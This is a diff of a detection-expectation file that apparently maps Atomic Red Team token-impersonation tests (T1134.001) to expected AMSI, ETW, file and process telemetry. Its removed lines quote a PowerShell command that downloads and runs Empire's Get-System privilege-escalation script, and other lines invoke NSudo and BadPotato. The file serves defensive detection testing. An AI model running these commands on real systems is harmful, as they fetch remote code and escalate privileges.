@@ -1,42 +1,13 @@
 T1134.001,windows,90db9e27,Named pipe client impersonation
-_E_,AMSI,app_name~=PowerShell
-_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-_E_,AMSI,scan_content~=IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
-_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
-_E_,ETW,event_msg~=Creating Scriptblock text
-_E_,ETW,event_data_list~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-_E_,ETW,event_data_list~=IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
+_E_,AMSI,scan_content*='System.dll'.*GetType('Microsoft.Win32.UnsafeNativeMethods')
+_E_,File,CREATE,path=\\.\pipe\TestSVC
 
 T1134.001,windows,34f0a430,`SeDebugPrivilege` token duplication
-_E_,AMSI,app_name~=PowerShell
-_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-_E_,AMSI,scan_content~=IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
-_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
-_E_,ETW,event_msg~=Creating Scriptblock text
-_E_,ETW,event_data_list~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-_E_,ETW,event_data_list~=IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
+_E_,AMSI,scan_content*='System.dll'.*GetType('Microsoft.Win32.UnsafeNativeMethods')
 
 T1134.001,windows,7be1bc0f,Launch NSudo Executable
 ARG,nsudo_path,PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe
-_E_,AMSI,app_name~=PowerShell
-_E_,AMSI,scan_content*=Start-Process .*atomics.*ExternalPayloads.*NSudo_8.2_All_Components.*NSudo Launcher.*x64.*NSudoLG.exe -Argument "-U:T -P:E cmd".*
-_E_,AMSI,scan_content~=Start-Sleep -Second 5
-_E_,AMSI,scan_content~=Stop-Process -Name "cmd" -force -erroraction silentlycontinue
-_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
-_E_,ETW,event_msg~=Creating Scriptblock text
-_E_,ETW,event_data_list*=Start-Process .*atomics.*ExternalPayloads.*NSudo_8.2_All_Components.*NSudo Launcher.*x64.*NSudoLG.exe -Argument "-U:T -P:E cmd".*
-_E_,ETW,event_data_list~=Start-Sleep -Second 5
-_E_,ETW,event_data_list~=Stop-Process -Name "cmd" -force -erroraction silentlycontinue
+_E_,AMSI,scan_content~=Start-Process,scan_content~=atomics/../ExternalPayloads/NSudo_8.2_All_Components/NSudo Launcher/x64/NSudoLG.exe -Argument "-U:T -P:E cmd",app_name~=PowerShell
 
 T1134.001,windows,9c6d799b,Bad Potato
-_E_,AMSI,app_name~=PowerShell
-_E_,AMSI,scan_content~=Start-Process .\BadPotato.exe notepad.exe
-_E_,AMSI,scan_content~=Start-Sleep -Second 20
-_E_,AMSI,scan_content~=Stop-Process -Name "notepad" -force -erroraction silentlycontinue
-_E_,AMSI,scan_content~=Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
-_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
-_E_,ETW,event_msg~=Creating Scriptblock text
-_E_,ETW,event_data_list~=Start-Process .\BadPotato.exe notepad.exe
-_E_,ETW,event_data_list~=Start-Sleep -Second 20
-_E_,ETW,event_data_list~=Stop-Process -Name "notepad" -force -erroraction silentlycontinue
-_E_,ETW,event_data_list~=Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
+_E_,Process,cmdline~=BadPotato.exe notepad.exe
